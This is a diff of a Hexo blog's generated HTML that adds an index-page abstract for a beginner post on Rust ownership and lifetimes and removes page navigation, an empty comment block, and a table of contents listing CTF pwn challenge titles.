+            <a class="abstract-title" href="/2025/05/03/rust%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/">
+                
+                <span class="abstract-title-text">rust入门_数据所有权与生命周期管理</span>
+            </a>
+            <div class="abstract-content">
+                所有权rust的数据类型分为两种，一种是实现了copy trait的数据类型如i32 u32，一种是没有实现copy trait的数据类型，如String，在进行变量间的赋值操作时，实现了copy trait类型的数据类型会将数据复制一份过去。而没有实现copy trait的数据类型则会将数据的所有权转移，先前对数据进行引用的符号的生命周期就结束了
+e.g.
+12345678910fn main() &#123;    let x: i32 = 5;    let y = x;    println!(&quot;x = &#123;&#125;, y = &#123;&#125;&qu...
+            </div>
+            <!-- read more -->
+            
+            <div class="abstract-post-meta">
+                <!-- date -->
+                <div class="abstract-date" title="Last updated: 2025/05/03">
+                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2025/05/03</span>
+                </div>
+                <!-- tags -->
+                
+                    <div class= abstract-tags >
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/05/22/ciscn-pwn/" title="ciscn_pwn">
-                    <div class="nextTitle">ciscn_pwn</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2024/05/14/miniL2024-pwn/" title="miniL2024_pwn">
-                    <div class="prevTitle">miniL2024_pwn</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- comment -->
     
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
-
-
-            
-
-            
-
-            
-
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
+        <a class="post-tag" href="javascript:void(0);" data-tags="os">os</a>
     
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+</div>
+
+                
+            </div>
+        </article>
+        <div class="index-post-divider"></div>
     
-    <!-- Mathjax -->
+    <!-- paginator  -->
     
 </main>
 
@@ -646,23 +542,6 @@
 
         </div>
         <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
-
-
-
-
-
-
-
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#close"><span class="toc-number">1.</span> <span class="toc-text">close</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pwn"><span class="toc-number">2.</span> <span class="toc-text">ez_pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#idea"><span class="toc-number">3.</span> <span class="toc-text">idea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#what"><span class="toc-number">4.</span> <span class="toc-text">what</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appetizers-%F0%9F%A5%95-working"><span class="toc-number">5.</span> <span class="toc-text">Appetizers_🥕[working]</span></a></li></ol>
-            </div>
         
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -2016,8 +1895,6 @@
         <!-- CNZZ -->
         
         <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
         
         <!-- mermaid -->
         
